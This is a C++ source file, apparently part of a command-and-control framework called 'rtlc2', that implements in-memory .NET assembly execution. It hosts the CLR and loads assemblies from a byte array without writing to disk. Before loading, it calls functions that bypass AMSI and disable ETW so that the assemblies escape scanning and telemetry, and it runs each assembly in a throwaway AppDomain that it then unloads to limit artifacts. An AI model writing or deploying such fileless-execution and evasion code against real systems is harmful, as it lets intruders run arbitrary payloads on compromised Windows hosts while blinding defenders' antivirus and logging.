// Execute-Assembly - Host .NET CLR in-process to run assemblies from memory
// Loads .NET assemblies without touching disk
#include "execution.h"
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <metahost.h>
#include <mscoree.h>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "mscoree.lib")

// CLR hosting interfaces
#import "mscorlib.tlb" raw_interfaces_only \
    high_method_prefix("_raw_") \
    rename("ReportEvent", "_ReportEvent") \
    rename("or", "_or")

namespace rtlc2 {
namespace execution {

// Redirect stdout to capture .NET assembly output
class OutputCapture {
public:
    OutputCapture() {
        // Create pipe for stdout capture
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        CreatePipe(&hRead_, &hWrite_, &sa, 0);
        SetHandleInformation(hRead_, HANDLE_FLAG_INHERIT, 0);

        // Save original handles
        origStdout_ = GetStdHandle(STD_OUTPUT_HANDLE);
        origStderr_ = GetStdHandle(STD_ERROR_HANDLE);

        // Redirect stdout and stderr to our pipe
        SetStdHandle(STD_OUTPUT_HANDLE, hWrite_);
        SetStdHandle(STD_ERROR_HANDLE, hWrite_);
    }

    ~OutputCapture() {
        // Restore original handles
        SetStdHandle(STD_OUTPUT_HANDLE, origStdout_);
        SetStdHandle(STD_ERROR_HANDLE, origStderr_);
        if (hRead_) CloseHandle(hRead_);
        if (hWrite_) CloseHandle(hWrite_);
    }

    std::string GetOutput() {
        // Close write end so ReadFile doesn't block
        CloseHandle(hWrite_);
        hWrite_ = NULL;

        std::string output;
        char buf[4096];
        DWORD bytesRead;
        while (ReadFile(hRead_, buf, sizeof(buf) - 1, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            output += buf;
        }
        return output;
    }

private:
    HANDLE hRead_ = NULL;
    HANDLE hWrite_ = NULL;
    HANDLE origStdout_ = NULL;
    HANDLE origStderr_ = NULL;
};

AssemblyResult ExecuteAssembly(const std::vector<uint8_t>& assembly_data,
                                const std::string& arguments,
                                const std::string& runtime_version) {
    AssemblyResult result = { false, "", -1 };

    if (assembly_data.empty()) {
        result.output = "Empty assembly data";
        return result;
    }

    // Initialize CLR
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICLRRuntimeHost* pRuntimeHost = NULL;

    HRESULT hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        result.output = "CLRCreateInstance failed: 0x" + std::to_string(hr);
        return result;
    }

    // Convert runtime version to wide string
    int wLen = MultiByteToWideChar(CP_ACP, 0, runtime_version.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wVersion(wLen);
    MultiByteToWideChar(CP_ACP, 0, runtime_version.c_str(), -1, wVersion.data(), wLen);

    hr = pMetaHost->GetRuntime(wVersion.data(), IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        pMetaHost->Release();
        result.output = "GetRuntime failed for " + runtime_version;
        return result;
    }

    BOOL loadable = FALSE;
    pRuntimeInfo->IsLoadable(&loadable);
    if (!loadable) {
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "Runtime not loadable";
        return result;
    }

    hr = pRuntimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) {
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "GetInterface for runtime host failed";
        return result;
    }

    // Bypass AMSI before loading .NET to prevent script/assembly scanning
    evasion::BypassAMSI();
    // Disable ETW to prevent telemetry during assembly execution
    evasion::DisableETW();

    hr = pRuntimeHost->Start();
    if (FAILED(hr) && hr != S_FALSE) { // S_FALSE = already started
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "CLR Start failed";
        return result;
    }

    // Use ICorRuntimeHost for more control (loading from byte array)
    ICorRuntimeHost* pCorHost = NULL;
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pCorHost);
    if (FAILED(hr)) {
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "Failed to get ICorRuntimeHost";
        return result;
    }

    // Create isolated AppDomain for each execution to prevent assembly
    // artifacts from persisting in the default domain
    IUnknown* pAppDomainThunk = NULL;
    bool usingIsolatedDomain = false;
    hr = pCorHost->CreateDomain(L"RTLExec", NULL, &pAppDomainThunk);
    if (SUCCEEDED(hr) && pAppDomainThunk) {
        usingIsolatedDomain = true;
    } else {
        // Fall back to default domain if isolated creation fails
        hr = pCorHost->GetDefaultDomain(&pAppDomainThunk);
        if (FAILED(hr)) {
            pCorHost->Release();
            pRuntimeHost->Release();
            pRuntimeInfo->Release();
            pMetaHost->Release();
            result.output = "GetDefaultDomain failed";
            return result;
        }
    }

    mscorlib::_AppDomain* pAppDomain = NULL;
    hr = pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (LPVOID*)&pAppDomain);
    pAppDomainThunk->Release();
    if (FAILED(hr)) {
        pCorHost->Release();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "QueryInterface for AppDomain failed";
        return result;
    }

    // Create SAFEARRAY from assembly bytes
    SAFEARRAYBOUND sab = { (ULONG)assembly_data.size(), 0 };
    SAFEARRAY* pSA = SafeArrayCreate(VT_UI1, 1, &sab);
    if (!pSA) {
        pAppDomain->Release();
        pCorHost->Release();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "SafeArrayCreate failed";
        return result;
    }

    void* saData = NULL;
    SafeArrayAccessData(pSA, &saData);
    memcpy(saData, assembly_data.data(), assembly_data.size());
    SafeArrayUnaccessData(pSA);

    // Load assembly from byte array
    mscorlib::_Assembly* pAssembly = NULL;
    hr = pAppDomain->Load_3(pSA, &pAssembly);
    SafeArrayDestroy(pSA);

    if (FAILED(hr) || !pAssembly) {
        pAppDomain->Release();
        pCorHost->Release();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "Assembly Load failed";
        return result;
    }

    // Get entry point
    mscorlib::_MethodInfo* pEntryPoint = NULL;
    hr = pAssembly->get_EntryPoint(&pEntryPoint);
    if (FAILED(hr) || !pEntryPoint) {
        pAssembly->Release();
        pAppDomain->Release();
        pCorHost->Release();
        pRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        result.output = "No entry point found";
        return result;
    }

    // Prepare arguments
    SAFEARRAY* psaArgs = NULL;
    if (!arguments.empty()) {
        // Split arguments by space (respecting quotes)
        std::vector<std::string> args;
        std::string arg;
        bool inQuote = false;
        for (char c : arguments) {
            if (c == '"') { inQuote = !inQuote; continue; }
            if (c == ' ' && !inQuote) {
                if (!arg.empty()) { args.push_back(arg); arg.clear(); }
                continue;
            }
            arg += c;
        }
        if (!arg.empty()) args.push_back(arg);

        psaArgs = SafeArrayCreateVector(VT_BSTR, 0, (ULONG)args.size());
        for (LONG i = 0; i < (LONG)args.size(); i++) {
            int bstrLen = MultiByteToWideChar(CP_ACP, 0, args[i].c_str(), -1, NULL, 0);
            std::vector<WCHAR> wArg(bstrLen);
            MultiByteToWideChar(CP_ACP, 0, args[i].c_str(), -1, wArg.data(), bstrLen);
            BSTR bstr = SysAllocString(wArg.data());
            SafeArrayPutElement(psaArgs, &i, bstr);
            SysFreeString(bstr);
        }
    } else {
        psaArgs = SafeArrayCreateVector(VT_BSTR, 0, 0);
    }

    // Wrap string array in a variant array (Main(string[] args))
    SAFEARRAY* psaMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    VARIANT vArgs;
    VariantInit(&vArgs);
    vArgs.vt = VT_ARRAY | VT_BSTR;
    vArgs.parray = psaArgs;
    LONG idx = 0;
    SafeArrayPutElement(psaMethodArgs, &idx, &vArgs);

    // Capture stdout
    OutputCapture capture;

    // Invoke entry point
    VARIANT vRet;
    VariantInit(&vRet);
    hr = pEntryPoint->Invoke_3(vRet, psaMethodArgs, &vRet);

    result.output = capture.GetOutput();
    result.success = SUCCEEDED(hr);
    result.exit_code = SUCCEEDED(hr) ? 0 : (int)hr;

    // Cleanup
    SafeArrayDestroy(psaMethodArgs);
    pEntryPoint->Release();
    pAssembly->Release();

    // Unload the isolated AppDomain to clean up loaded assemblies
    if (usingIsolatedDomain) {
        IUnknown* pDomainUnk = NULL;
        pAppDomain->QueryInterface(IID_IUnknown, (LPVOID*)&pDomainUnk);
        pAppDomain->Release();
        if (pDomainUnk) {
            pCorHost->UnloadDomain(pDomainUnk);
            pDomainUnk->Release();
        }
    } else {
        pAppDomain->Release();
    }

    pCorHost->Release();
    pRuntimeHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();

    return result;
}

} // namespace execution
} // namespace rtlc2

#endif // RTLC2_WINDOWS
